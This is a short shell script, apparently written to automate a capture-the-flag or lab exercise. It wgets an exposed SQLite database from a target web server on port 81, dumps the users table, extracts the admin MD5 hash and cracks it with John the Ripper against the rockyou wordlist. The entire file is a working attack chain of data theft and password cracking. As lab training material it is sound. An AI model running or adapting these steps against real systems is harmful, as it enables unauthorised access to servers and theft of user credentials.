#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/ 2>/dev/null

# Collect database content from assets directory (look at the page source code)
wget -q http://$target_ip:81/assets/webapp.db
mv webapp.db /work/webapp.db

# Use sqlite3 to gather content
# Perform the query
sqlite3 /work/webapp.db ".tables" > /work/tables
sqlite3 /work/webapp.db "PRAGMA table_info(users)" > /work/headers
sqlite3 /work/webapp.db "SELECT * FROM users;" > /work/users

# Gather admin password
HASH=$(grep admin /work/users | awk -F'|' '{print $3}')
echo $HASH > /work/hash.txt

# Crack it with John
rm /opt/john/john.pot 2>/dev/null
/opt/john/john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /work/hash.txt 2>/dev/null
/opt/john/john --show /work/hash.txt 2>/dev/null
PASSWORD=$(cat /opt/john/john.pot | awk -F':' '{print $2}')
echo $PASSWORD

